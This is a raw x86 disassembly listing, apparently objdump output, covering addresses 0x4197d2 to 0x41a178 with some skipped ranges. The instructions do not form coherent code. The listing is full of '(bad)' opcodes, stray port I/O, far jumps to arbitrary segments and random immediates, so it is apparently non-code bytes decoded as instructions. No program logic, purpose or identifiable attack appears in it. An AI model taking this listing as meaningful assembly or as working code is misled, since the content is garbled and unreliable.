  4197d2:	xchg   DWORD PTR [ecx],ebp
  4197d4:	mov    eax,0xd58e349
  4197d9:	into   
  4197da:	cs stos DWORD PTR es:[edi],eax
  4197dc:	or     BYTE PTR [ecx-0x164e560d],0x3f
  4197e3:	push   ecx
  4197e4:	add    BYTE PTR [edi+0x1fa2b6bf],ah
  4197ea:	jo     0x4197df
  4197ec:	mov    eax,ds:0x76b6f258
  4197f1:	inc    esp
  4197f2:	repnz scas al,BYTE PTR es:[edi]
  4197f4:	jnp    0x4197bc
  4197f6:	xlat   BYTE PTR ds:[ebx]
  4197f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197f8:	jno    0x4197ed
  4197fa:	mov    ecx,0x66695be6
  4197ff:	movhlps xmm0,xmm4
  419802:	rol    BYTE PTR [ebx],0x5a
  419805:	aaa    
  419806:	xor    BYTE PTR [edi+0x41],al
  419809:	jmp    0x9a0d91c3
  41980e:	or     edi,DWORD PTR ss:[ebp+0x63a142a3]
  419815:	xchg   edi,eax
  419816:	lock in eax,dx
  419818:	fbld   TBYTE PTR [ecx-0x2ba763f4]
  41981e:	push   ecx
  41981f:	test   eax,0xff0ce0c
  419824:	(bad)  
  419825:	mov    cl,0x62
  419827:	mov    dh,0x2e
  419829:	jne    0x4198a3
  41982b:	sub    BYTE PTR [esi],0xc3
  41982e:	cmp    esp,0x717b6cd1
  419834:	xor    BYTE PTR [edx],ah
  419836:	(bad)  
  419837:	cs in  eax,0xe3
  41983a:	(bad)  
  41983b:	hlt    
  41983c:	jbe    0x4197e6
  41983e:	popa   
  41983f:	fwait
  419840:	clc    
  419841:	lds    edx,FWORD PTR [ebp+0x19]
  419844:	call   0x8253:0x78f8a575
  41984b:	ret    
  41984c:	xchg   BYTE PTR [esi+ecx*4+0x40998554],dh
  419853:	pop    ecx
  419854:	xlat   BYTE PTR ds:[ebx]
  419855:	adc    eax,0x43f97f33
  41985a:	inc    ecx
  41985b:	test   ebp,edx
  41985d:	cmp    bh,BYTE PTR [edx+0x67]
  419860:	into   
  419861:	lods   al,BYTE PTR ds:[esi]
  419862:	mov    edi,0x7732bb48
  419867:	pop    eax
  419868:	jp     0x41980a
  41986a:	dec    ebp
  41986b:	jl     0x41980a
  41986d:	add    al,al
  41986f:	mov    ebx,0x973b3e14
  419874:	inc    edi
  419875:	mov    ebp,0x765bf98b
  41987a:	pop    esi
  41987b:	inc    esp
  41987c:	push   edx
  41987d:	jg     0x4198b8
  41987f:	pop    ds
  419880:	repz scas eax,DWORD PTR es:[edi]
  419882:	out    dx,eax
  419883:	in     al,0x67
  419885:	sbb    dh,BYTE PTR [ebx-0x24e9595d]
  41988b:	loopne 0x419907
  41988d:	push   es
  41988e:	push   esp
  41988f:	push   esi
	...
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	(bad)  
  419901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419902:	scas   eax,DWORD PTR es:[edi]
  419903:	or     al,0xcc
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	adc    al,0x9b
  41990e:	adc    al,0x3d
  419910:	xchg   edi,eax
  419911:	xor    eax,0x3a7eee84
  419916:	bound  ebp,QWORD PTR [esi+0x30]
  419919:	(bad)  
  41991a:	mov    ch,0x7a
  41991c:	dec    ecx
  41991d:	fs test al,0x98
  419920:	dec    BYTE PTR [edx]
  419922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419923:	jp     0x419938
  419925:	repnz cdq 
  419927:	pop    ebx
  419928:	in     eax,dx
  419929:	(bad)  
  41992a:	ins    DWORD PTR es:[edi],dx
  41992b:	mov    es,WORD PTR [eax-0x12]
  41992e:	mov    edx,0x47b0b2fc
  419933:	push   0x0
  419935:	push   esp
  419936:	or     DWORD PTR [ecx],0xffffffe8
  419939:	pop    ebx
  41993a:	std    
  41993b:	sbb    DWORD PTR [ebx+ebp*4],ecx
  41993e:	mov    esp,0x8df6e57b
  419943:	das    
  419944:	test   eax,0x5fe72323
  419949:	std    
  41994a:	push   ebx
  41994b:	or     ah,bl
  41994d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41994e:	cld    
  41994f:	xchg   ebx,eax
  419950:	pushf  
  419951:	jl     0x419925
  419953:	mov    bl,BYTE PTR [ebx-0x6dd00675]
  419959:	dec    ebx
  41995a:	imul   eax
  41995c:	imul   edx,ecx,0x3b
  41995f:	pop    esp
  419960:	iret   
  419961:	bound  edx,QWORD PTR [esi+0x79668c50]
  419967:	mov    cl,0x78
  419969:	mov    ebx,0xa25fda4d
  41996e:	xchg   ebx,eax
  41996f:	inc    edi
  419970:	cdq    
  419971:	in     al,dx
  419972:	arpl   ax,si
  419974:	call   0x2e00fb12
  419979:	outs   dx,BYTE PTR ds:[esi]
  41997a:	adc    eax,0x7d19baac
  41997f:	jle    0x4199eb
  419981:	lods   eax,DWORD PTR ds:[esi]
  419982:	mul    BYTE PTR [esi]
  419984:	fstp   TBYTE PTR [ebx]
  419986:	js     0x4199a0
  419988:	leave  
  419989:	mov    ch,0x2e
  41998b:	mov    ebp,0x23e65969
  419990:	xchg   ebx,eax
  419991:	aad    0x43
  419993:	or     DWORD PTR [esi],ecx
  419995:	data16 aaa 
  419997:	jge    0x419969
  419999:	not    BYTE PTR [eax]
  41999b:	fistp  WORD PTR [ecx+0x6f18fe6a]
  4199a1:	jg     0x4199a2
  4199a3:	jns    0x4199cd
  4199a5:	ret    0x5a56
  4199a8:	rcr    BYTE PTR [edi],cl
  4199aa:	inc    ebp
  4199ab:	imul   edx,DWORD PTR [edi+eiz*2+0x77202e0e],0x3f54d110
  4199b6:	(bad)  
  4199b7:	sub    al,0x1f
  4199b9:	mov    dl,0x1c
  4199bb:	loop   0x4199ab
  4199bd:	and    ebx,ecx
  4199bf:	aas    
  4199c0:	sar    ecx,0xdb
  4199c3:	sub    eax,0x14545c07
  4199c8:	xchg   esp,eax
  4199c9:	gs in  al,0x82
  4199cc:	cwde   
  4199cd:	iret   
  4199ce:	xchg   ecx,eax
  4199cf:	ja     0x419967
  4199d1:	dec    esp
  4199d2:	fimul  WORD PTR [edi-0x33]
  4199d5:	dec    esi
  4199d6:	add    al,BYTE PTR [esi-0x6c]
  4199d9:	(bad)  
  4199da:	xchg   edx,eax
  4199db:	or     al,0x61
  4199dd:	pushf  
  4199de:	cmc    
  4199df:	adc    BYTE PTR [eax],0x57
  4199e2:	add    al,BYTE PTR [ebp-0x34]
  4199e5:	fcmovu st,st(1)
  4199e7:	sub    BYTE PTR [ecx-0x51],0xa0
  4199eb:	sar    BYTE PTR [ebp+0x7f],0xcb
  4199ef:	ds pop ss
  4199f1:	sbb    al,0x3c
  4199f3:	popa   
  4199f4:	fwait
  4199f5:	adc    eax,0xe13a8f9d
  4199fa:	in     eax,0x24
  4199fc:	jle    0x419a56
  4199fe:	(bad)  
  4199ff:	or     DWORD PTR [edx],ebx
  419a01:	loopne 0x4199f4
  419a03:	and    DWORD PTR [esi-0xc],edx
  419a06:	out    dx,eax
  419a07:	pushf  
  419a08:	xchg   ecx,eax
  419a09:	popf   
  419a0a:	and    ebp,DWORD PTR ds:0x647ccae8
	...
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0x6ab9dcc2,cl
  419a83:	not    al
  419a85:	sgdtd  [eax]
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	in     eax,0x58
  419a8e:	fdiv   QWORD PTR [ebx+0x51]
  419a91:	jp     0x419a9f
  419a93:	pop    edi
  419a94:	js     0x419a7c
  419a96:	add    ch,bh
  419a98:	mov    al,0x86
  419a9a:	jmp    0x9647:0xca9dc6cc
  419aa1:	je     0x419a38
  419aa3:	add    ebx,0x2f
  419aa6:	std    
  419aa7:	xor    eax,0x58234e7d
  419aac:	loop   0x419b0d
  419aae:	push   esi
  419aaf:	shr    DWORD PTR [edx],1
  419ab1:	leave  
  419ab2:	sti    
  419ab3:	loop   0x419ac3
  419ab5:	dec    ebx
  419ab6:	jp     0x419a4c
  419ab8:	pop    eax
  419ab9:	mov    esp,0xd7cc7560
  419abe:	shl    edx,cl
  419ac0:	push   ebp
  419ac1:	clc    
  419ac2:	adc    al,0x94
  419ac4:	mov    ah,0x5c
  419ac6:	mov    ah,0x4f
  419ac8:	dec    bp
  419aca:	ss pop cx
  419acd:	fstp   TBYTE PTR [ecx-0x6]
  419ad0:	and    dh,bh
  419ad2:	sbb    al,0xef
  419ad4:	sub    ebx,esi
  419ad6:	mov    ds:0x87c80161,eax
  419adb:	ficomp WORD PTR [esi+0x61a53594]
  419ae1:	lods   eax,DWORD PTR ds:[esi]
  419ae2:	mov    esi,0x3f11fda9
  419ae7:	jge    0x419b5d
  419ae9:	sbb    esp,DWORD PTR [ecx]
  419aeb:	xchg   esp,eax
  419aec:	push   esp
  419aed:	mov    ebx,0x6271af41
  419af2:	push   esp
  419af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419af4:	outs   dx,BYTE PTR ds:[esi]
  419af5:	fwait
  419af6:	sbb    edi,DWORD PTR [eax-0x80]
  419af9:	out    0x23,eax
  419afb:	push   DWORD PTR [eax+0x68]
  419afe:	pop    edx
  419aff:	push   edx
  419b00:	lock ror BYTE PTR [esi+ebx*1+0x39c1d3f6],0x2a
  419b09:	sbb    al,0x6d
  419b0b:	popa   
  419b0c:	dec    esp
  419b0d:	sbb    DWORD PTR [eax-0x20],eax
  419b10:	adc    ecx,esp
  419b12:	mov    edx,0xa9638baa
  419b17:	sub    al,ch
  419b19:	loopne 0x419af5
  419b1b:	stos   BYTE PTR es:[edi],al
  419b1c:	ret    0xac74
  419b1f:	jmp    0xe566:0xab899890
  419b26:	dec    ebp
  419b27:	out    dx,al
  419b28:	out    0xd7,al
  419b2a:	in     al,dx
  419b2b:	mov    edi,gs
  419b2d:	arpl   WORD PTR [ecx],cx
  419b2f:	test   al,0x67
  419b31:	push   eax
  419b32:	dec    ecx
  419b33:	lods   al,BYTE PTR ds:[esi]
  419b34:	retf   0xe659
  419b37:	rol    BYTE PTR [edi+0x30],0x7d
  419b3b:	std    
  419b3c:	fisubr WORD PTR [edx-0x2ae5191]
  419b42:	cmp    DWORD PTR [ebx+0x1f5fd9b0],ebp
  419b48:	mov    al,0xb6
  419b4a:	lahf   
  419b4b:	jno    0x419bc1
  419b4d:	sub    DWORD PTR [ebp-0x567f651f],0xffffffd3
  419b54:	daa    
  419b55:	mov    eax,ds:0x978128bf
  419b5a:	inc    eax
  419b5b:	pusha  
  419b5c:	dec    eax
  419b5d:	rcl    BYTE PTR [esi+eiz*8-0x694d682d],1
  419b64:	inc    esp
  419b65:	icebp  
  419b66:	add    dl,BYTE PTR ss:[ebx-0x36713f2a]
  419b6d:	jns    0x419b2e
  419b6f:	jg     0x419b43
  419b71:	mov    al,0x14
  419b73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b74:	push   cs
  419b75:	jno    0x419b73
  419b77:	mov    esp,0xac05e03d
  419b7c:	cmp    BYTE PTR [ecx],dh
  419b7e:	push   cs
  419b7f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b81:	aaa    
  419b82:	popa   
  419b83:	ins    BYTE PTR es:[edi],dx
  419b84:	lock xchg esi,eax
  419b86:	inc    esp
  419b87:	(bad)  
  419b88:	test   BYTE PTR [ecx+0x129c5725],bh
  419b8e:	and    al,BYTE PTR cs:[eax]
	...
  419bf1:	add    BYTE PTR [eax],al
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x9a
  419c01:	mov    al,0x9
  419c03:	add    edx,esp
  419c05:	adc    BYTE PTR [ecx],al
  419c07:	add    BYTE PTR [ecx+eax*1],al
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	mov    esi,0x5481417c
  419c11:	scas   eax,DWORD PTR es:[edi]
  419c12:	add    edx,eax
  419c14:	sub    eax,ecx
  419c16:	imul   ecx,DWORD PTR [ecx],0xffffffa4
  419c19:	and    esi,DWORD PTR [edx-0x58]
  419c1c:	jge    0x419be9
  419c1e:	mov    eax,ds:0x858bcb81
  419c23:	xchg   ebp,eax
  419c24:	call   0xbe1b2f62
  419c29:	mov    cl,0xd6
  419c2b:	mov    ds:0xef84f356,eax
  419c30:	mov    bh,0xac
  419c32:	push   ecx
  419c33:	clc    
  419c34:	jns    0x419bc8
  419c36:	fwait
  419c37:	dec    esi
  419c38:	xchg   DWORD PTR [esi+0x64],ecx
  419c3b:	pop    esi
  419c3c:	pop    es
  419c3d:	test   eax,0x355812a8
  419c42:	repz cmp DWORD PTR ds:0xead4372e,esi
  419c49:	fistp  WORD PTR ds:0x2171ede
  419c50:	loop   0x419c10
  419c52:	pop    edi
  419c53:	jns    0x419be3
  419c55:	test   DWORD PTR [ebx],ebx
  419c57:	in     eax,dx
  419c58:	jb     0x419c69
  419c5a:	shl    edi,cl
  419c5c:	aam    0xde
  419c5e:	in     eax,0x1c
  419c60:	inc    ecx
  419c61:	sub    eax,0xa7558bc2
  419c66:	and    esp,edi
  419c68:	dec    ebp
  419c69:	sbb    al,0x78
  419c6b:	push   DWORD PTR [eax+0x5f24718a]
  419c71:	jmp    0xe61b:0x521dd4b3
  419c78:	jp     0x419c91
  419c7a:	std    
  419c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c7c:	inc    ebp
  419c7d:	(bad)  
  419c7e:	pop    esi
  419c7f:	sbb    esp,DWORD PTR [ebp+0x65]
  419c82:	cmc    
  419c83:	call   0x6d9c6983
  419c88:	adc    DWORD PTR [edx-0x52],0x90dfb854
  419c8f:	(bad)  
  419c90:	push   edx
  419c91:	test   BYTE PTR [edx+0x4e],bh
  419c94:	in     al,dx
  419c95:	cs xor dh,bl
  419c98:	pop    es
  419c99:	sbb    esi,DWORD PTR [esi]
  419c9b:	jnp    0x419d07
  419c9d:	mov    eax,0xe2125d4f
  419ca2:	jecxz  0x419ca6
  419ca4:	aaa    
  419ca5:	adc    al,0x4b
  419ca7:	jge    0x419c42
  419ca9:	mov    dl,0xbd
  419cab:	or     al,0xf5
  419cad:	std    
  419cae:	jb     0x419c64
  419cb0:	mov    cl,0xcb
  419cb2:	es in  eax,0x1
  419cb5:	push   cs
  419cb6:	inc    edx
  419cb7:	xchg   ebx,eax
  419cb8:	sti    
  419cb9:	inc    esp
  419cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cbb:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  419cbd:	pop    edx
  419cbe:	daa    
  419cbf:	int    0x2e
  419cc1:	add    BYTE PTR [edx*1+0x4554e931],ch
  419cc8:	cwde   
  419cc9:	fbld   TBYTE PTR [edi+esi*4+0x2c]
  419ccd:	push   cs
  419cce:	je     0x419c5a
  419cd0:	pop    ds
  419cd1:	aas    
  419cd2:	cmp    BYTE PTR [edi-0x64],al
  419cd5:	in     al,0xc9
  419cd7:	mov    al,0xef
  419cd9:	pop    esp
  419cda:	ja     0x419d1d
  419cdc:	lea    ebp,[esi]
  419cde:	add    ecx,edx
  419ce0:	mov    ch,0x56
  419ce2:	clc    
  419ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ce4:	in     al,0xfd
  419ce6:	jge    0x419d2a
  419ce8:	xchg   DWORD PTR [edi+0x7b],ecx
  419ceb:	xor    eax,0x99f7de5a
  419cf0:	push   ebx
  419cf1:	inc    eax
  419cf2:	dec    edx
  419cf3:	js     0x419d48
  419cf5:	or     al,BYTE PTR [edx+0x5a]
  419cf8:	jg     0x419d69
  419cfa:	popa   
  419cfb:	fst    DWORD PTR [ebx-0x107dffc1]
  419d01:	psrad  mm5,QWORD PTR [edx-0x53e0c38b]
  419d08:	or     eax,0x339032e2
  419d0d:	sub    bh,bh
  419d0f:	add    BYTE PTR ss:[eax],al
	...
  419d72:	add    BYTE PTR [eax],al
  419d74:	lock xchg edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	ss fcmove st,st(4)
  419d81:	push   ds
  419d82:	mov    ebx,0x111d8e6
  419d87:	add    BYTE PTR [ecx+eax*1],al
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	pop    edi
  419d8d:	popf   
  419d8e:	jg     0x419d41
  419d90:	xor    eax,0x4904da13
  419d96:	cmp    ebp,DWORD PTR [esp+esi*4+0x2e42a350]
  419d9d:	or     ch,cl
  419d9f:	clc    
  419da0:	in     eax,0xd0
  419da2:	sub    edx,DWORD PTR [eax+0x16757ac0]
  419da8:	ret    
  419da9:	sbb    esi,DWORD PTR [esi-0x21]
  419dac:	sti    
  419dad:	mov    edi,DWORD PTR es:[eax+eiz*8-0x432fc720]
  419db5:	fs mov dl,0x46
  419db8:	jne    0x419dc1
  419dba:	imul   ecx,DWORD PTR [esi-0x78],0xffffff81
  419dbe:	ja     0x419dec
  419dc0:	cmp    al,0x98
  419dc2:	sbb    eax,0x9b130f3b
  419dc7:	pop    esi
  419dc8:	addr16 pop edi
  419dca:	fisub  DWORD PTR [esi+0x43a772b]
  419dd0:	repz add al,0xbb
  419dd3:	div    ah
  419dd5:	ins    DWORD PTR es:[edi],dx
  419dd6:	sub    ecx,DWORD PTR [ebx]
  419dd8:	adc    BYTE PTR [ecx-0x7b],ah
  419ddb:	dec    ecx
  419ddc:	mov    edi,0xbc8567cc
  419de1:	adc    eax,0x7635ebde
  419de6:	mov    bh,0xee
  419de8:	inc    ecx
  419de9:	sbb    ecx,esi
  419deb:	mov    ch,0xf
  419ded:	(bad)  
  419dee:	cmp    al,0x9c
  419df0:	(bad)  
  419df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419df2:	and    ecx,DWORD PTR [ecx+0x637a5671]
  419df8:	lods   al,BYTE PTR ds:[esi]
  419df9:	lea    ebp,[eax-0x24]
  419dfc:	or     DWORD PTR [ebx],esi
  419dfe:	add    BYTE PTR [esi-0x28],dh
  419e01:	add    eax,DWORD PTR [edx-0x871d33a]
  419e07:	add    DWORD PTR [ebp+0x7a],edi
  419e0a:	dec    esi
  419e0b:	cmc    
  419e0c:	stos   DWORD PTR es:[edi],eax
  419e0d:	xchg   BYTE PTR [eax+0xf],dh
  419e10:	push   edx
  419e11:	stc    
  419e12:	jl     0x419e18
  419e14:	fdivr  DWORD PTR [ebx+0x75]
  419e17:	xor    eax,0x57317cee
  419e1c:	(bad)  
  419e1d:	mov    edx,0x7713f4e
  419e22:	stos   BYTE PTR es:[edi],al
  419e23:	add    al,0xff
  419e25:	cmp    esi,DWORD PTR [ebx+0x20]
  419e28:	in     eax,0x28
  419e2a:	xchg   ebx,eax
  419e2b:	xor    eax,0xb6f06731
  419e30:	sbb    eax,0x5f615343
  419e35:	shl    DWORD PTR [esp+esi*1-0x3ff0b79a],cl
  419e3c:	add    ebp,DWORD PTR [ecx]
  419e3e:	pop    ds
  419e3f:	fs dec ecx
  419e41:	aad    0x57
  419e43:	xchg   edi,eax
  419e44:	mov    ebx,0x55054e74
  419e49:	das    
  419e4a:	(bad)  
  419e4b:	xor    bh,BYTE PTR [ebp-0x34]
  419e4e:	repz cwde 
  419e50:	or     al,0x44
  419e52:	jmp    0x71c5d017
  419e57:	jge    0x419e80
  419e59:	sub    eax,DWORD PTR [esi]
  419e5b:	rcr    DWORD PTR [edx+0x33c22a9a],0xde
  419e62:	loopne 0x419ed4
  419e64:	lock jnp 0x419e9a
  419e67:	stos   DWORD PTR es:[edi],eax
  419e68:	call   0xbf7a:0x670e56a0
  419e6f:	repz std 
  419e71:	nop
  419e72:	xchg   esp,eax
  419e73:	fwait
  419e74:	or     bh,BYTE PTR [esi-0x449c8839]
  419e7a:	sub    DWORD PTR [edi+0x2cc745f0],edx
  419e80:	jnp    0x419e89
  419e82:	push   ss
  419e83:	pop    ds
  419e84:	xchg   ecx,eax
  419e85:	pop    esp
  419e86:	lock (bad) 
  419e88:	out    0x3f,eax
  419e8a:	js     0x419e33
  419e8c:	cmp    eax,0xf45bcb
	...
  419ef1:	add    BYTE PTR [eax],al
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	stos   BYTE PTR es:[edi],al
  419f01:	nop
  419f02:	mov    ah,0xba
  419f04:	fcom   QWORD PTR [edx]
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    al,0x1
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	in     al,0x4f
  419f0e:	shl    BYTE PTR [edx-0x3b],0x87
  419f12:	push   edx
  419f13:	inc    DWORD PTR [edi]
  419f15:	and    al,0xce
  419f17:	sbb    esi,ebp
  419f19:	add    al,0xc3
  419f1b:	in     al,0x65
  419f1d:	nop
  419f1e:	mov    al,0xd8
  419f20:	xlat   BYTE PTR ds:[ebx]
  419f21:	cmp    bh,dh
  419f23:	add    esp,ecx
  419f25:	fld    TBYTE PTR [ebp+0x43505a6d]
  419f2b:	push   ds
  419f2c:	aaa    
  419f2d:	or     DWORD PTR [ebp-0x5a2230a6],eax
  419f33:	(bad)  
  419f34:	xchg   esp,eax
  419f35:	and    BYTE PTR [edi-0x2f],0xdd
  419f39:	outs   dx,BYTE PTR ds:[esi]
  419f3a:	push   ss
  419f3b:	(bad)  
  419f3c:	lea    edx,[ebp-0x4d]
  419f3f:	jnp    0x419fa6
  419f41:	neg    ecx
  419f43:	fwait
  419f44:	sar    BYTE PTR [ebx],1
  419f46:	fimul  WORD PTR [ebp-0x5d]
  419f49:	push   ebp
  419f4a:	(bad)  
  419f4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f4c:	test   ebp,ebp
  419f4e:	mov    dl,0x63
  419f50:	add    edx,DWORD PTR [ebx]
  419f52:	outs   dx,BYTE PTR ds:[esi]
  419f53:	jl     0x419efb
  419f55:	add    dl,BYTE PTR [ebp-0x17]
  419f58:	in     eax,dx
  419f59:	pop    ebx
  419f5a:	ret    
  419f5b:	inc    ecx
  419f5c:	dec    eax
  419f5d:	push   esp
  419f5e:	shl    DWORD PTR [eax],0xcf
  419f61:	push   esp
  419f62:	or     eax,0xe5894521
  419f67:	scas   al,BYTE PTR es:[edi]
  419f68:	aad    0x59
  419f6a:	xor    al,0xa
  419f6c:	rcr    DWORD PTR [ebp-0x27368a45],cl
  419f72:	dec    ebx
  419f73:	arpl   WORD PTR [eax-0x510a6726],ax
  419f79:	adc    eax,0x3d8858e6
  419f7e:	mov    dh,0x1c
  419f80:	sbb    edi,DWORD PTR [esi+0x4d3ad495]
  419f86:	jns    0x419f34
  419f88:	call   0xac368d97
  419f8d:	jne    0x419f17
  419f8f:	daa    
  419f90:	fild   QWORD PTR [edx+esi*4-0xde61f4b]
  419f97:	lods   eax,DWORD PTR ds:[si]
  419f99:	or     DWORD PTR [esi+eax*1],esi
  419f9c:	(bad)  
  419f9d:	jg     0x419f71
  419f9f:	ret    
  419fa0:	xor    BYTE PTR [edi],al
  419fa2:	lds    eax,FWORD PTR [edi+0x146bbd88]
  419fa8:	mov    ebx,0xe90f39cd
  419fad:	and    cl,BYTE PTR [esi]
  419faf:	inc    edx
  419fb0:	inc    edi
  419fb1:	stos   DWORD PTR es:[edi],eax
  419fb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fb3:	mov    ah,0x1b
  419fb5:	cmp    cl,BYTE PTR [eax+0x5f]
  419fb8:	jmp    DWORD PTR [esp+esi*1-0x9]
  419fbc:	cmp    DWORD PTR [ecx+0x4a],ebx
  419fbf:	inc    ecx
  419fc0:	jbe    0x419fc4
  419fc2:	shr    DWORD PTR [edi],1
  419fc4:	mov    bh,BYTE PTR [esi]
  419fc6:	pop    ecx
  419fc7:	popa   
  419fc8:	fbld   TBYTE PTR [ecx-0x4568de85]
  419fce:	or     al,0x6a
  419fd0:	fst    QWORD PTR [edi-0x31]
  419fd3:	popa   
  419fd4:	test   al,0xe5
  419fd6:	cmp    al,0xe1
  419fd8:	push   0x7ca46a
  419fdd:	and    bh,BYTE PTR [eax+ebx*8+0x33ac7049]
  419fe4:	pop    esi
  419fe5:	inc    edx
  419fe6:	daa    
  419fe7:	clc    
  419fe8:	retf   0x441d
  419feb:	inc    ebp
  419fec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fed:	mov    edi,0xe20d5616
  419ff2:	adc    DWORD PTR ds:0x8c6d6a49,ecx
  419ff8:	push   ebx
  419ff9:	jnp    0x419fa0
  419ffb:	imul   BYTE PTR [esi]
  419ffd:	xor    ch,bh
  419fff:	jmp    0xeea6a81b
  41a004:	neg    BYTE PTR [edx-0x2682e8d1]
  41a00a:	int    0x8e
  41a00c:	mov    bl,0xda
  41a00e:	cwde   
  41a00f:	pop    DWORD PTR [eax]
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x3c],bh
  41a081:	cmp    eax,0x13e01913
  41a086:	add    DWORD PTR [eax],eax
  41a088:	add    al,0x1
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	int3   
  41a08d:	in     eax,dx
  41a08e:	sahf   
  41a08f:	in     al,dx
  41a090:	cmp    eax,0xcc6c88d7
  41a095:	push   edx
  41a096:	push   esp
  41a097:	stc    
  41a098:	iret   
  41a099:	scas   al,BYTE PTR es:[edi]
  41a09a:	dec    ebp
  41a09b:	sub    eax,0xbe3a5ad9
  41a0a0:	push   cs
  41a0a1:	dec    esi
  41a0a2:	das    
  41a0a3:	into   
  41a0a4:	push   es
  41a0a5:	outs   dx,DWORD PTR ds:[esi]
  41a0a6:	aam    0x5c
  41a0a8:	jge    0x41a0c4
  41a0aa:	pop    ebx
  41a0ab:	retf   0xbbad
  41a0ae:	int    0x97
  41a0b0:	es pop edx
  41a0b2:	jmp    DWORD PTR [edi+0x66b24731]
  41a0b8:	test   DWORD PTR [edx*4-0x3b997d98],edx
  41a0bf:	jmp    0xa15b:0x8b8e2d2b
  41a0c6:	or     eax,0xfb416691
  41a0cb:	xchg   esp,eax
  41a0cc:	retf   
  41a0cd:	mov    ch,0x46
  41a0cf:	jnp    0x41a095
  41a0d1:	inc    ebp
  41a0d2:	dec    esp
  41a0d3:	push   ss
  41a0d4:	xchg   ebp,eax
  41a0d5:	add    BYTE PTR [esi-0x6b],al
  41a0d8:	gs jge 0x41a13d
  41a0db:	push   esi
  41a0dc:	sub    BYTE PTR [ecx],dl
  41a0de:	daa    
  41a0df:	mov    ds:0x3ecf87e2,al
  41a0e4:	or     al,0x5d
  41a0e6:	and    edi,DWORD PTR [ebx+0x77]
  41a0e9:	loope  0x41a0df
  41a0eb:	mov    eax,edx
  41a0ed:	mov    edx,0x2c9555d6
  41a0f2:	fisubr WORD PTR [esi+ebp*4-0x52d9e3ea]
  41a0f9:	aad    0x31
  41a0fb:	iret   
  41a0fc:	scas   al,BYTE PTR es:[edi]
  41a0fd:	xor    al,dl
  41a0ff:	in     al,0xe8
  41a101:	loope  0x41a0cd
  41a103:	aaa    
  41a104:	xchg   esp,eax
  41a105:	push   edi
  41a106:	frstor [ecx+esi*1-0x1642926a]
  41a10d:	rcr    ecx,cl
  41a10f:	dec    esi
  41a110:	fstp   TBYTE PTR [ecx]
  41a112:	cmp    eax,0x5bbe83ef
  41a117:	mov    BYTE PTR [edx],0xb8
  41a11a:	cli    
  41a11b:	aas    
  41a11c:	dec    esi
  41a11d:	retf   
  41a11e:	out    0x14,al
  41a120:	cwde   
  41a121:	push   ebx
  41a122:	mov    WORD PTR [eax+0x5ca28ad],ss
  41a128:	dec    eax
  41a129:	pop    es
  41a12a:	gs dec ebp
  41a12c:	sbb    eax,eax
  41a12e:	cmp    DWORD PTR [edi+eiz*1],ecx
  41a131:	sub    eax,0xa040b49
  41a136:	xor    BYTE PTR [ebp+0x14],cl
  41a139:	sbb    ebx,DWORD PTR [ebp-0x4d]
  41a13c:	sahf   
  41a13d:	mov    DWORD PTR [esi+0x5c1f38d0],ebx
  41a143:	ja     0x41a12c
  41a145:	sti    
  41a146:	mov    DWORD PTR [eax+0x4a],eax
  41a149:	std    
  41a14a:	(bad)  
  41a14b:	rcr    DWORD PTR [edx+0x44c17c93],1
  41a151:	shl    ebx,0x88
  41a154:	xchg   ebp,eax
  41a155:	mov    esi,0x738f8fcf
  41a15a:	inc    esi
  41a15b:	fisttp QWORD PTR [esp+eax*8-0x4cad09a7]
  41a162:	and    al,0xcc
  41a164:	xor    ch,cl
  41a166:	jae    0x41a14b
  41a168:	xchg   ebp,eax
  41a169:	adc    edx,0xffffffdd
  41a16c:	ds cmc 
  41a16e:	ds leave 
  41a170:	ret    
  41a171:	cmp    bl,bh
  41a173:	ds push ds
  41a175:	scas   eax,DWORD PTR es:[edi]
  41a176:	int3   
  41a177:	inc    ebx
  41a178:	dec    edi
